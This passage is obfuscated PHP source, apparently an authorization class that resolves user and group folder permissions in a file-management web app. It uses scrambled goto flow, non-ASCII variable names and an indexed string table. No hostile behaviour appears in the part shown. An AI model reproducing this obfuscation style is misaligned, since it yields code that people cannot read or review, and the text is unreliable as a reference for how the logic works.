$this->sourceAuthInfo($d‡ÌÙ»‰)); goto aØ†ÊÛŸ˜ë; cÅŸ‰Š¹Ä: $EùÀ‰ñ×±À =& $_SERVER[Æ¼ôºÙï]; $B„‘Ô­‰Â¿ = $B„‘Ô­‰Â¿ ? $B„‘Ô­‰Â¿ : USER_ID; $e—’ŞÎ‰®« = $this->makeAuthDeep($B„‘Ô­‰Â¿); goto a¼ˆ‚ß³”Š; aØ†ÊÛŸ˜ë: } protected function makeAuthDeep($FŒãä’ôîñ = false) { goto Eé‡¡Ô¥‚¿; D‰¦Ú›Åó¬: $c„…ª»‰¡ = array(); if ($F×¸Äé¥ğè) { $FÉ¥ä˜²ˆ¼ = $fˆÃ‘¨ØàÀ->where(array($dÎØ™¤šÅÊ[387] => array($dÎØ™¤šÅÊ[402], $F×¸Äé¥ğè)))->select(); foreach ($FÉ¥ä˜²ˆ¼ as $F¡¤É†Ğòí) { $A°¦Ì¬±Ù  = $fˆÃ‘¨ØàÀ->parentLevelArray($F¡¤É†Ğòí[$dÎØ™¤šÅÊ[477]]); $DÎ§­Ó÷ = array_merge($DÎ§­Ó÷, $A°¦Ì¬±Ù ); $eáÇ—ÎÇê[] = $F¡¤É†Ğòí[$dÎØ™¤šÅÊ[474]]; $bØÀ®ìšÕ¿[$F¡¤É†Ğòí[$dÎØ™¤šÅÊ[387]]] = $A°¦Ì¬±Ù ; $a¶õÀó‹À[$F¡¤É†Ğòí[$dÎØ™¤šÅÊ[387]]] = $F¡¤É†Ğòí[$dÎØ™¤šÅÊ[474]]; } } $eáÇ—ÎÇê = array_values(array_unique($eáÇ—ÎÇê)); goto a¼£Ñº‡à×; d°ğ³ÑƒÈ‚: $bØÀ®ìšÕ¿ = array(); $a¶õÀó‹À = array(); $F†ÙÇÉ‚±Ê = array(); goto D‰¦Ú›Åó¬; bá•¬¼¤øƒ: if ($AÈÌ‘ƒŒ±ˆ) { $fÒĞ‚ßÜ¢­ = array(array($dÎØ™¤šÅÊ[389] => SourceModel::TYPE_USER, $dÎØ™¤šÅÊ[474] => $FŒãä’ôîñ), array($dÎØ™¤šÅÊ[389] => SourceModel::TYPE_GROUP, $dÎØ™¤šÅÊ[474] => array($dÎØ™¤šÅÊ[402], $AÈÌ‘ƒŒ±ˆ)), $dÎØ™¤šÅÊ[936] => $dÎØ™¤šÅÊ[1751]); } $E¿ô„å’ãŒ = $this->field($dÎØ™¤šÅÊ[1850])->where($fÒĞ‚ßÜ¢­)->select(); $F×¸Äé¥ğè = array(); goto EÖğî”İ­; eëµËØàƒ‹: foreach ($eáÇ—ÎÇê as $dÔ•¾ÎÜ¸¡) { $Aà¾óñä‹Ú = $EÅ²ºÓ—Ïï->getInfo($dÔ•¾ÎÜ¸¡); $DÎ§­Ó÷[] = $Aà¾óñä‹Ú[$dÎØ™¤šÅÊ[84]][$dÎØ™¤šÅÊ[387]]; $F†ÙÇÉ‚±Ê[$dÔ•¾ÎÜ¸¡] = $Aà¾óñä‹Ú[$dÎØ™¤šÅÊ[84]][$dÎØ™¤šÅÊ[387]]; $c„…ª»‰¡[$dÔ•¾ÎÜ¸¡] = $fˆÃ‘¨ØàÀ->parentLevelArray($Aà¾óñä‹Ú[$dÎØ™¤šÅÊ[477]]); } foreach ($bØÀ®ìšÕ¿ as $AâÆÇ—èÃÂ => $eÙ íâòœ) { $EÂ‡ãŠ–¾… = $a¶õÀó‹À[$AâÆÇ—èÃÂ]; if (!$EÂ‡ãŠ–¾… || !$F†ÙÇÉ‚±Ê[$EÂ‡ãŠ–¾…]) { continue; } $e°ÄßªÁ¹Å = array(); foreach ($c„…ª»‰¡[$EÂ‡ãŠ–¾…] as $dÔ•¾ÎÜ¸¡) { $e°ÄßªÁ¹Å[] = $F†ÙÇÉ‚±Ê[$dÔ•¾ÎÜ¸¡]; } $bØÀ®ìšÕ¿[$AâÆÇ—èÃÂ] = array_merge($e°ÄßªÁ¹Å, $eÙ íâòœ); } $DÎ§­Ó÷ = array_values(array_unique($DÎ§­Ó÷)); goto B‚ç£¦ğ‹; Cò³µ»«Ù: foreach ($bÇ¥˜†½ as $aâ©‘çÙŠ) { if ($aâ©‘çÙŠ[$dÎØ™¤šÅÊ[394]] == 0 && $aâ©‘çÙŠ[$dÎØ™¤šÅÊ[1683]] == $dÎØ™¤šÅÊ[86]) { $Cò»÷²–ãï[] = $aâ©‘çÙŠ[$dÎØ™¤šÅÊ[385]]; } } $AÈÌ‘ƒŒ±ˆ = $this->userGroupParents($FŒãä’ôîñ); $fÒĞ‚ßÜ¢­ = array($dÎØ™¤šÅÊ[389] => SourceModel::TYPE_USER, $dÎØ™¤šÅÊ[474] => $FŒãä’ôîñ); goto bá•¬¼¤øƒ; fà°¹£°´®: $eáÇ—ÎÇê = $AÈÌ‘ƒŒ±ˆ; $fˆÃ‘¨ØàÀ = Model($dÎØ™¤šÅÊ[1182]); $EÅ²ºÓ—Ïï = Model($dÎØ™¤šÅÊ[476]); goto d°ğ³ÑƒÈ‚; Eé‡¡Ô¥‚¿: $dÎØ™¤šÅÊ =& $_SERVER[Æ¼ôºÙï]; static $E šö©Üâê = array(); $FŒãä’ôîñ = $FŒãä’ôîñ ? $FŒãä’ôîñ : USER_ID; goto E¿¯òì‡µ; B‚ç£¦ğ‹: $C„²­Ñó†‡ = array($dÎØ™¤šÅÊ[1842] => $DÎ§­Ó÷, $dÎØ™¤šÅÊ[1843] => $bØÀ®ìšÕ¿); $E šö©Üâê[$FŒãä’ôîñ] = $C„²­Ñó†‡; return $C„²­Ñó†‡; goto c¾‰÷÷¥Ü; a¼£Ñº‡à×: $FÕè“ßÍˆ = $eáÇ—ÎÇê; foreach ($FÕè“ßÍˆ as $dÔ•¾ÎÜ¸¡) { $Aà¾óñä‹Ú = $EÅ²ºÓ—Ïï->getInfo($dÔ•¾ÎÜ¸¡); $A°¦Ì¬±Ù  = $fˆÃ‘¨ØàÀ->parentLevelArray($Aà¾óñä‹Ú[$dÎØ™¤šÅÊ[477]]); $eáÇ—ÎÇê = array_merge($eáÇ—ÎÇê, $A°¦Ì¬±Ù ); } $eáÇ—ÎÇê = array_values(array_unique($eáÇ—ÎÇê)); goto eëµËØàƒ‹; EÖğî”İ­: $f’¾çô¸Ø° = array_to_keyvalue_group($E¿ô„å’ãŒ, $dÎØ™¤šÅÊ[387]); foreach ($f’¾çô¸Ø° as $E‘•¬ßê => $Dİ»Úà›ô) { $BŸ¸Ò’ê = $this->authArrayCheck($Dİ»Úà›ô, $FŒãä’ôîñ); if ($BŸ¸Ò’ê[$dÎØ™¤šÅÊ[395]] > 0) { $F×¸Äé¥ğè[] = $E‘•¬ßê . $dÎØ™¤šÅÊ[33]; } } $DÎ§­Ó÷ = array(); goto fà°¹£°´®; E¿¯òì‡µ: if (isset($E šö©Üâê[$FŒãä’ôîñ])) { return $E šö©Üâê[$FŒãä’ôîñ]; } $bÇ¥˜†½ = Model($dÎØ™¤šÅÊ[1849])->listData(); $Cò»÷²–ãï = array(); goto Cò³µ»«Ù; c¾‰÷÷¥Ü: } private function makeSourceAuth($Dõ·åÃ…ˆ, $Fİ»º”óùÌ, $AŒ¶©Ì•™” = false) { goto A†ƒØ¡ƒÆ; dÚ ¾âÃøğ: if (!$c½Ñöä…áõ) { $BÁÖ¸ÁŸô = Model($AÉ‚¶ºîèÃ[476])->getInfo($D½Ç“Òœ‹¶); $cµ„öáììÖ = explode($AÉ‚¶ºîèÃ[47], trim($BÁÖ¸ÁŸô[$AÉ‚¶ºîèÃ[477]], $AÉ‚¶ºîèÃ[47])); $cµ„öáììÖ = array_reverse($cµ„öáììÖ); foreach ($cµ„öáììÖ as $d‹î°ƒ­âö) { if ($d‹î°ƒ­âö == $AÉ‚¶ºîèÃ[486] || $d‹î°ƒ­âö == $EŞ’°ŒŠ) { continue; } $a†öÀ¬ª„Œ = $this->groupRootAuth($d‹î°ƒ­âö, $AŒ¶©Ì•™”); if (!$a†öÀ¬ª„Œ) { continue; } $c½Ñöä…áõ = $this->groupAuthInfo($a†öÀ¬ª„Œ, $d‹î°ƒ­âö); break; } } if (!$c½Ñöä…áõ || $c½Ñöä…áõ[$AÉ‚¶ºîèÃ[395]] <= 0) { $b¸¤²¼äÍÂ = $this->authDeepCheck($Dõ·åÃ…ˆ[$AÉ‚¶ºîèÃ[387]], $AŒ¶©Ì•™”); if ($b¸¤²¼äÍÂ) { $c½Ñöä…áõ = $b¸¤²¼äÍÂ; } } return $c½Ñöä…áõ; goto F»©†ãß‰ñ; A†ƒØ¡ƒÆ: $AÉ‚¶ºîèÃ =& $_SERVER[Æ¼ôºÙï]; $EŞ’°ŒŠ = $AÉ‚¶ºîèÃ[86]; $D½Ç“Òœ‹¶ = $Dõ·åÃ…ˆ[$AÉ‚¶ºîèÃ[474]]; goto CÉŠÀòœí; CÉŠÀòœí: $eó„Ü¡Í· = $Dõ·åÃ…ˆ[$AÉ‚¶ºîèÃ[389]] == SourceModel::TYPE_GROUP; $Cä‘öÏ¯®» = $eó„Ü¡Í· ? $this->groupRootAuth($D½Ç“Òœ‹¶, $AŒ¶©Ì•™”) : !1; if ($Cä‘öÏ¯®» && Model($AÉ‚¶ºîèÃ[1830])->authCheckAction($Cä‘öÏ¯®»[$AÉ‚¶ºîèÃ[394]], $AÉ‚¶ºîèÃ[1681])) { return $this->groupAuthInfo($Cä‘öÏ¯®», $D½Ç“Òœ‹¶); } goto b­ÛŸ’ÖÀ; b­ÛŸ’ÖÀ: $F–‚é‡÷ç = Model($AÉ‚¶ºîèÃ[1182])->parentLevelArray($Dõ·åÃ…ˆ[$AÉ‚¶ºîèÃ[477]]); $F–‚é‡÷ç = array_merge(array($Dõ·åÃ…ˆ[$AÉ‚¶ºîèÃ[387]]), array_reverse($F–‚é‡÷ç)); $c½Ñöä…áõ = !1; goto bêØ’‚óßù; bêØ’‚óßù: foreach ($F–‚é‡÷ç as $c–ß²òĞù) { if (!isset($Fİ»º”óùÌ[$c–ß²òĞù])) { continue; } $eŸÃóË¢‰Ç = $this->authMake($Fİ»º”óùÌ[$c–ß²òĞù], $AŒ¶©Ì•™”); if ($eŸÃóË¢‰Ç[$AÉ‚¶ºîèÃ[435]]) { $c½Ñöä…áõ = $eŸÃóË¢‰Ç; break; } } if (!$eó„Ü¡Í·) { return $c½Ñöä…áõ; } if (!$c½Ñöä…áõ && $Cä‘öÏ¯®») { $c½Ñöä…áõ = $this->groupAuthInfo($Cä‘öÏ¯®», $D½Ç“Òœ‹¶); } goto dÚ ¾âÃøğ; F»©†ãß‰ñ: } private function userIsRoot($BĞ§‡ù = false) { $c¿™…ÊÄ¾‡ =& $_SERVER[Æ¼ôºÙï]; if (!$BĞ§‡ù && _get($GLOBALS, $c¿™…ÊÄ¾‡[475])) { return !0; } $d÷³ñ‡é = Model($c¿™…ÊÄ¾‡[495])->getInfo($BĞ§‡ù); $f³äÒ•¥× = Model($c¿™…ÊÄ¾‡[1851])->listData($d÷³ñ‡é[$c¿™…ÊÄ¾‡[1386]]); if ($f³äÒ•¥× && $f³äÒ•¥×[$c¿™…ÊÄ¾‡[1258]][$c¿™…ÊÄ¾‡[1852]] == 1) { return !0; } return !1; } private function sourceAuthInfo($e‘È‰ïˆ½è) { goto a«Ÿ½çƒù; a«Ÿ½çƒù: $B®¶àÒÆë =& $_SERVER[Æ¼ôºÙï]; $C”¬ÒƒÛù = Model($B®¶àÒÆë[1182]); $Fß¢Ø³Å‹¬ = $C”¬ÒƒÛù->sourceInfo($e‘È‰ïˆ½è); goto e‚œ²Â«; a´’‘ã£ó¶: $bÓ¡¾ƒŠÊŸ = $C”¬ÒƒÛù->_listAppendPath($bÓ¡¾ƒŠÊŸ); $Fß¢Ø³Å‹¬ = $bÓ¡¾ƒŠÊŸ[0]; $d˜ñ½ªò×² = $Fß¢Ø³Å‹¬[$B®¶àÒÆë[484]]; goto DÖÊå¯”îÏ; e‚œ²Â«: if (!$Fß¢Ø³Å‹¬) { return !1; } $C”¬ÒƒÛù->groupPathDisplay($Fß¢Ø³Å‹¬); $bÓ¡¾ƒŠÊŸ = array($Fß¢Ø³Å‹¬); goto a´’‘ã£ó¶; DÖÊå¯”îÏ: if (isset($Fß¢Ø³Å‹¬[$B®¶àÒÆë[482]])) { $d‰ÔˆÊï– = explode($B®¶àÒÆë[8], trim($Fß¢Ø³Å‹¬[$B®¶àÒÆë[484]], $B®¶àÒÆë[8])); array_shift($d‰ÔˆÊï–); $d˜ñ½ªò×² = $Fß¢Ø³Å‹¬[$B®¶àÒÆë[480]] . $B®¶àÒÆë[1853] . implode($B®¶àÒÆë[8], $d‰ÔˆÊï–); } return array($B®¶àÒÆë[404] => $Fß¢Ø³Å‹¬[$B®¶àÒÆë[28]], $B®¶àÒÆë[75] => KodIO::make($Fß¢Ø³Å‹¬[$B®¶àÒÆë[387]]), $B®¶àÒÆë[1854] => $d˜ñ½ªò×²); goto DÒêø¤Ğ½Ğ; DÒêø¤Ğ½Ğ: } private function groupAuthInfo($aÃ¶Ãñ„àç, $A‹’ˆæÂ) { $e†¸†Ãéçå =& $_SERVER[Æ¼ôºÙï]; $bØôÑÜË = Model($e†¸†Ãéçå[476])->getInfo($A‹’ˆæÂ); return array($e†¸†Ãéçå[1855] => intval($aÃ¶Ãñ„àç[$e†¸†Ãéçå[394]]), $e†¸†Ãéçå[1839] => $aÃ¶Ãñ„àç, $e†¸†Ãéçå[1856] => LNG($e†¸†Ãéçå[1857]), $e†¸†Ãéçå[1848] => array($e†¸†Ãéçå[404] => $bØôÑÜË[$e†¸†Ãéçå[28]], $e†¸†Ãéçå[75] => KodIO::make($bØôÑÜË[$e†¸†Ãéçå[84]][$e†¸†Ãéçå[387]]), $e†¸†Ãéçå[1854] => $bØôÑÜË[$e†¸†Ãéçå[481]])); } protected function groupRootAuth($B¯–±‘»¦², $cÌšè¿ÀÕÜ = false) { goto CğŠ«íµˆâ; d±öÄÔ§Î: $fõ‚´Øğ–ø = $this->userGroupList($cÌšè¿ÀÕÜ); $b× ¯Ü· = isset($fõ‚´Øğ–ø[$B¯–±‘»¦²]) ? $fõ‚´Øğ–ø[$B¯–±‘»¦²][$A³¤¨º“™Ò[394]] : !1; if ($b× ¯Ü· && Model($A³¤¨º“™Ò[1830])->authCheckAction($b× ¯Ü·[$A³¤¨º“™Ò[394]], $A³¤¨º“™Ò[1681])) { $C‰‰óé«“[$A¢­Šº—™Ğ] = $b× ¯Ü·; return $b× ¯Ü·; } goto aÏê¤Ìî›; aÏê¤Ìî›: $C‹‘´‘‘îİ = $this->sourceAuthSelect($B»‡çº­Ú[$A³¤¨º“™Ò[84]][$A³¤¨º“™Ò[387]]); $Bä›¦«ê‘¦ = $C‹‘´‘‘îİ ? $this->authMake($C‹‘´‘‘îİ, $cÌšè¿ÀÕÜ) : !1; $FêÓ‹ĞÚ„ô = $Bä›¦«ê‘¦ ? $Bä›¦«ê‘¦[$A³¤¨º“™Ò[435]] : !1; goto fó‚øÆ²ƒ; CğŠ«íµˆâ: $A³¤¨º“™Ò =& $_SERVER[Æ¼ôºÙï]; $cÌšè¿ÀÕÜ = $cÌšè¿ÀÕÜ ? $cÌšè¿ÀÕÜ : USER_ID; $A¢­Šº—™Ğ = $cÌšè¿ÀÕÜ . $A³¤¨º“™Ò[1858] . $B¯–±‘»¦²; goto c„°ª˜¾ÍÈ; fó‚øÆ²ƒ: $C‰‰óé«“[$A¢­Šº—™Ğ] = $FêÓ‹ĞÚ„ô ? $FêÓ‹ĞÚ„ô : $b× ¯Ü·; return $C‰‰óé«“[$A¢­Šº—™Ğ]; goto B¯©Åöµ¨; c„°ª˜¾ÍÈ: static $C‰‰óé«“ = array(); if (isset($C‰‰óé«“[$A¢­Šº—™Ğ])) { return $C‰‰óé«“[$A¢­Šº—™Ğ]; } $B»‡çº­Ú = Model($A³¤¨º“™Ò[476])->getInfo($B¯–±‘»¦²); goto d±öÄÔ§Î; B¯©Åöµ¨: } public function authOwnerApply($cË’”ŠÖÒÙ) { goto f³Ÿ´„¨¹; d³ã‹é‘™ø: $cË’”ŠÖÒÙ[$fØ›¨ì¤[394]][$fØ›¨ì¤[1861]] = Model($fØ›¨ì¤[492])->userListInfo($BÇ½ÜÉÑ½); return $cË’”ŠÖÒÙ; goto FÖ¸º—©¥; eëï¶˜’ŠÇ: $eóÓË”¼Ô = array(); $BÇ½ÜÉÑ½ = array(); foreach ($B»ìµÖ• as $d¢öîÔÕâ => $D·…ÒÊÖò) { $eèà²‘£² = $this->authFolderOwnerUser($D·…ÒÊÖò); $eóÓË”¼Ô[$d¢öîÔÕâ] = $eèà²‘£²; $BÇ½ÜÉÑ½ = array_merge($BÇ½ÜÉÑ½, $eèà²‘£²[$fØ›¨ì¤[551]]); if ($eèà²‘£²[$fØ›¨ì¤[1860]]) { break; } } goto a•Í‚Ş”İ; f³Ÿ´„¨¹: $fØ›¨ì¤ =& $_SERVER[Æ¼ôºÙï]; if (empty($cË’”ŠÖÒÙ[$fØ›¨ì¤[394]]) || isset($cË’”ŠÖÒÙ[$fØ›¨ì¤[1859]]) && $cË’”ŠÖÒÙ[$fØ›¨ì¤[1859]]) { return $cË’”ŠÖÒÙ; } if (AuthModel::authCheckRoot($cË’”ŠÖÒÙ[$fØ›¨ì¤[394]][$fØ›¨ì¤[395]])) { return $cË’”ŠÖÒÙ; } goto D áÃîïï; a•Í‚Ş”İ: if (count($BÇ½ÜÉÑ½) == 0) { $BÇ½ÜÉÑ½ = $this->authFolderOwnerGroup($cË’”ŠÖÒÙ[$fØ›¨ì¤[474]]); } $BÇ½ÜÉÑ½ = array_unique($BÇ½ÜÉÑ½); if (AuthModel::authCheckRoot($cË’”ŠÖÒÙ[$fØ›¨ì¤[394]][$fØ›¨ì¤[395]])) { $BÇ½ÜÉÑ½[] = USER_ID; } goto d³ã‹é‘™ø; D áÃîïï: $aĞÆÖËïÏó = Model($fØ›¨ì¤[1182])->parentLevelArray($cË’”ŠÖÒÙ[$fØ›¨ì¤[477]]); $aĞÆÖËïÏó = array_merge(array($cË’”ŠÖÒÙ[$fØ›¨ì¤[387]]), array_reverse($aĞÆÖËïÏó)); $B»ìµÖ• = $this->sourceAuthSelect($aĞÆÖËïÏó); goto eëï¶˜’ŠÇ; FÖ¸º—©¥: } private function authFolderOwnerGroup($dÕÈ¸š±”) { $aƒ”Ã«íŸ =& $_SERVER[Æ¼ôºÙï]; $AÔïÄ«Ó ² = Model($aƒ”Ã«íŸ[1745])->where(array($aƒ”Ã«íŸ[1661] => $dÕÈ¸š±”))->select(); $BÀêµˆ˜è• = array(); if (!$AÔïÄ«Ó ²) { return $BÀêµˆ˜è•; } foreach ($AÔïÄ«Ó ² as $b´¿Îè‘«¿) { $f®‹™ÊÖ¥† = $this->authInfo($b´¿Îè‘«¿); if (AuthModel::authCheckRoot($f®‹™ÊÖ¥†[$aƒ”Ã«íŸ[394]])) { $BÀêµˆ˜è•[] = $b´¿Îè‘«¿[$aƒ”Ã«íŸ[1502]]; } } return $BÀêµˆ˜è•; } private function authFolderOwnerUser($fÇêéå©äŞ) { $a‡‘Ù²‚Ç˜ =& $_SERVER[Æ¼ôºÙï]; $FïÛÄêß„‰ = array(); $c„ŠïÃçª‘ = !1; foreach ($fÇêéå©äŞ as $D• éí¹÷È) { $dæï÷öñ¤¶ = $this->authInfo($D• éí¹÷È); if ($D• éí¹÷È[$a‡‘Ù²‚Ç˜[474]] == $a‡‘Ù²‚Ç˜[486]) { $c„ŠïÃçª‘ = !0; } if ($D• éí¹÷È[$a‡‘Ù²‚Ç˜[389]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($dæï÷öñ¤¶[$a‡‘Ù²‚Ç˜[394]])) { $FïÛÄêß„‰[] = $D• éí¹÷È[$a‡‘Ù²‚Ç˜[474]]; } } } return array($a‡‘Ù²‚Ç˜[551] => $FïÛÄêß„‰, $a‡‘Ù²‚Ç˜[1860] => $c„ŠïÃçª‘); } public function authMake($d˜¾”ã“‡¯, $EÍˆ‹ÖÊËĞ = false) { $açÒ¢°ô¤é =& $_SERVER[Æ¼ôºÙï]; $FÉ‹É‹ç“ = $this->authArrayCheck($d˜¾”ã“‡¯, $EÍˆ‹ÖÊËĞ); if ($FÉ‹É‹ç“[$açÒ¢°ô¤é[1862]]) { $FÉ‹É‹ç“[$açÒ¢°ô¤é[1862]] = $this->sourceAuthInfo($FÉ‹É‹ç“[$açÒ¢°ô¤é[1862]]); } return $FÉ‹É‹ç“; } public function authArrayCheck($D•¼—ÁºÚù, $D®é¾»Ãê‰ = false) { goto FïÁìá÷¤ç; BÚôµ¢¡šô: $CïôÙƒù‹¬ = 0; $B’Ì´‰§Âä = 0; $fÄæ‰¾¤¹ù = 0; goto BâÎ«ÁÒ©å; BâÎ«ÁÒ©å: $C…¹åŠÂå£ = 1000; $Eã¨•§é ç = 0; $FçåÉ„Æƒ² = 0; goto Dµ…¸–äŠß; B•Ğİé¸ñâ: foreach ($D•¼—ÁºÚù as $BÚ¿ÏõÀÀ) { $B¥—¡ …«‹ = $this->authInfo($BÚ¿ÏõÀÀ); if (!$B¥—¡ …«‹) { continue; } $AÆ³äÖÒá¸ = $BÚ¿ÏõÀÀ[$cÁª”…[474]]; $A¯Ì³Ì‡˜ê = intval($B¥—¡ …«‹[$cÁª”…[394]]); if ($BÚ¿ÏõÀÀ[$cÁª”…[389]] == SourceModel::TYPE_USER && $AÆ³äÖÒá¸ == $D®é¾»Ãê‰) { $A¥Ï¤† ÷ = !0; $B®ÌÒ×ğÇ· = $B¥—¡ …«‹; $f‘ùŸ‚Ü“« = $A¯Ì³Ì‡˜ê; } else { if ($BÚ¿ÏõÀÀ[$cÁª”…[389]] == SourceModel::TYPE_GROUP && $this->groupContainUser($AÆ³äÖÒá¸, $D®é¾»Ãê‰)) { $CïôÙƒù‹¬ = !0; $dÎëîé¼ôê = $this->groupStepToUserGroup($AÆ³äÖÒá¸, $D®é¾»Ãê‰); if ($dÎëîé¼ôê < $C…¹åŠÂå£) { $C…¹åŠÂå£ = $dÎëîé¼ôê; $B’Ì´‰§Âä = $A¯Ì³Ì‡˜ê; $fÄæ‰¾¤¹ù = $B¥—¡ …«‹; $Eã¨•§é ç = $AÆ³äÖÒá¸; } if ($dÎëîé¼ôê == $C…¹åŠÂå£ && $A¯Ì³Ì‡˜ê >= $B’Ì´‰§Âä) { $B’Ì´‰§Âä = $A¯Ì³Ì‡˜ê; $fÄæ‰¾¤¹ù = $B¥—¡ …«‹; $Eã¨•§é ç = $AÆ³äÖÒá¸; } } else { if ($AÆ³äÖÒá¸ == $cÁª”…[486]) { $FçåÉ„Æƒ² = !0; $aäÒ›ï¿ø‹ = $B¥—¡ …«‹; $C­ëÌ¢òÁ = $A¯Ì³Ì‡˜ê; } } } } if ($A¥Ï¤† ÷) { $eï“›Ä·± = $f‘ùŸ‚Ü“«; $B¥—¡ …«‹ = $B®ÌÒ×ğÇ·; $dÕ—áªæœŒ = LNG($cÁª”…[1863]); } else { if ($CïôÙƒù‹¬) { $eï“›Ä·± = $B’Ì´‰§Âä; $B¥—¡ …«‹ = $fÄæ‰¾¤¹ù; $bĞ¦œÍŠ—æ = Model($cÁª”…[476])->getInfo($Eã¨•§é ç); $dÕ—áªæœŒ = $cÁª”…[159] . $bĞ¦œÍŠ—æ[$cÁª”…[481]] . $cÁª”…[1864] . LNG($cÁª”…[1865]); } else { if ($FçåÉ„Æƒ²) { $eï“›Ä·± = $C­ëÌ¢òÁ; $B¥—¡ …«‹ = $aäÒ›ï¿ø‹; $dÕ—áªæœŒ = LNG($cÁª”…[1836]); } else { $eï“›Ä·± = 0; $B¥—¡ …«‹ = !1; $dÕ—áªæœŒ = $cÁª”…[33]; } } } $BÃˆœšœ = array($cÁª”…[1855] => intval($eï“›Ä·±), $cÁª”…[1839] => $B¥—¡ …«‹, $cÁª”…[1856] => $dÕ—áªæœŒ, $cÁª”…[1848] => $BÚ¿ÏõÀÀ[$cÁª”…[387]]); goto Eø¸§òò£; b‰ÒâºŸ™¨: $A¥Ï¤† ÷ = 0; $f‘ùŸ‚Ü“« = 0; $B®ÌÒ×ğÇ· = 0; goto BÚôµ¢¡šô; Eø¸§òò£: return $BÃˆœšœ; goto cù˜ìŠñ·; Dµ…¸–äŠß: $C­ëÌ¢òÁ = 0; $aäÒ›ï¿ø‹ = 0; $BÚ¿ÏõÀÀ = array($cÁª”…[387] => 0); goto B•Ğİé¸ñâ; FïÁìá÷¤ç: $cÁª”… =& $_SERVER[Æ¼ôºÙï]; if (!$D•¼—ÁºÚù) { return array($cÁª”…[395] => 0, $cÁª”…[435] => !1); } $D®é¾»Ãê‰ = $D®é¾»Ãê‰ ? $D®é¾»Ãê‰ : USER_ID; goto b‰ÒâºŸ™¨; cù˜ìŠñ·: } private function groupContainUser($e™åÜËŠ–á, $EÄ´¼«ùƒ = false) { return in_array($e™åÜËŠ–á, $this->userGroupParents($EÄ´¼«ùƒ)); } private function groupStepToUserGroup($bİÃÆ‘†ˆÛ, $e‡œ‘‡è«Ş = false) { goto C¾¤åºÒé; C¾¤åºÒé: $bòš‚É«ŠÔ =& $_SERVER[Æ¼ôºÙï]; $d“Ÿ‚µŞ÷ˆ = $this->userGroupList($e‡œ‘‡è«Ş); $D´İˆ„¯í = 1000; goto d˜÷çä¡Ô; D¹öëôÇ¼ä: return $D´İˆ„¯í; goto F§ùïš”® ; d˜÷çä¡Ô: $B¾˜±ËÃª½ = $GLOBALS[$bòš‚É«ŠÔ[6]][$bòš‚É«ŠÔ[87]][$bòš‚É«ŠÔ[1757]] == 1; $Fêµ£İÏ’„ = $B¾˜±ËÃª½ ? 3 : 2; foreach ($d“Ÿ‚µŞ÷ˆ as $Aõ—È¢Î‘…) { if ($Aõ—È¢Î‘…[$bòš‚É«ŠÔ[1661]] == $bİÃÆ‘†ˆÛ) { return 0; } $bàÛÄ…¡ù§ = explode($bòš‚É«ŠÔ[47], trim($Aõ—È¢Î‘…[$bòš‚É«ŠÔ[477]], $bòš‚É«ŠÔ[47])); if ($bàÛÄ…¡ù§[0] == $bòš‚É«ŠÔ[486] && count($bàÛÄ…¡ù§) > $Fêµ£İÏ’„) { $BÆ÷¥¦Ñƒ = array_reverse(array_slice($bàÛÄ…¡ù§, $Fêµ£İÏ’„)); $eíÊ¼ß½Óˆ = array_search($bİÃÆ‘†ˆÛ, $BÆ÷¥¦Ñƒ); if ($eíÊ¼ß½Óˆ !== !1 && $eíÊ¼ß½Óˆ + 1 <= $D´İˆ„¯í) { $D´İˆ„¯í = $eíÊ¼ß½Óˆ + 1; } } } goto D¹öëôÇ¼ä; F§ùïš”® : } private function userGroupList($bìÑ¹”Ü«ì = false) { $FÄ³‹Ÿ›½° =& $_SERVER[Æ¼ôºÙï]; static $cÖŸÃá“¸ = array(); if (isset($cÖŸÃá“¸[$bìÑ¹”Ü«ì])) { return $cÖŸÃá“¸[$bìÑ¹”Ü«ì]; } $c£Í»æè§ = Model($FÄ³‹Ÿ›½°[495])->getInfo($bìÑ¹”Ü«ì); $cÖŸÃá“¸[$bìÑ¹”Ü«ì] = array_to_keyvalue($c£Í»æè§[$FÄ³‹Ÿ›½°[1837]], $FÄ³‹Ÿ›½°[1661]); return $cÖŸÃá“¸[$bìÑ¹”Ü«ì]; } public function userGroupParents($DŞƒóàÛÚ) { goto e˜ç¼ŸÃ÷«; CÅˆêª‰ñ¿: if (isset($f…Ÿ‘‚‡Ù[$DŞƒóàÛÚ])) { return $f…Ÿ‘‚‡Ù[$DŞƒóàÛÚ]; } $cÏîìÖŞË = $this->userGroupList($DŞƒóàÛÚ); $f˜“èòË•í = array(); goto AÑ†Áƒâšª; AÑ†Áƒâšª: $D¸Á•±ŠÊƒ = $GLOBALS[$DÁÖ‚¹À×[6]][$DÁÖ‚¹À×[87]][$DÁÖ‚¹À×[1757]] == 1; $aÇÎ±ñç×¾ = $D¸Á•±ŠÊƒ ? 3 : 2; foreach ($cÏîìÖŞË as $Dº÷áåŞ·ë) { $B‚øÕ¿ÖÁ = array($Dº÷áåŞ·ë[$DÁÖ‚¹À×[1661]]); $fèŠ–î³¹ = explode($DÁÖ‚¹À×[47], trim($Dº÷áåŞ·ë[$DÁÖ‚¹À×[477]], $DÁÖ‚¹À×[47])); if ($fèŠ–î³¹[0] == $DÁÖ‚¹À×[486] && count($fèŠ–î³¹) > $aÇÎ±ñç×¾) { $aš¦…áÄò† = array_slice($fèŠ–î³¹, $aÇÎ±ñç×¾); $B‚øÕ¿ÖÁ = array_merge($B‚øÕ¿ÖÁ, array_reverse($aš¦…áÄò†)); } $f˜“èòË•í = array_merge($f˜“èòË•í, $B‚øÕ¿ÖÁ); } goto b—ù±åÕ•; e˜ç¼ŸÃ÷«: $DÁÖ‚¹À× =& $_SERVER[Æ¼ôºÙï]; static $f…Ÿ‘‚‡Ù = array(); $DŞƒóàÛÚ = $DŞƒóàÛÚ ? $DŞƒóàÛÚ : USER_ID; goto CÅˆêª‰ñ¿; b—ù±åÕ•: $f…Ÿ‘‚‡Ù[$DŞƒóàÛÚ] = array_unique($f˜“èòË•í); return $f…Ÿ‘‚‡Ù[$DŞƒóàÛÚ]; goto bÕ†òŒ”»; bÕ†òŒ”»: } public function authTargetInfoMake($f¤ÔğçËöÖ) { goto bø“÷ó‡ÒÏ; EøÇµ‘ÄŒì: return array($f˜¦‘˜ ¥Ü[1866] => $B¢„Üù„Œ‰, $f˜¦‘˜ ¥Ü[1867] => $C Â¿ìà‹š); goto b÷¡ßÓ¤ï„; bø“÷ó‡ÒÏ: $f˜¦‘˜ ¥Ü =& $_SERVER[Æ¼ôºÙï]; $B¢„Üù„Œ‰ = array(); $C Â¿ìà‹š = array(); goto døš²Š‡‰ƒ; døš²Š‡‰ƒ: 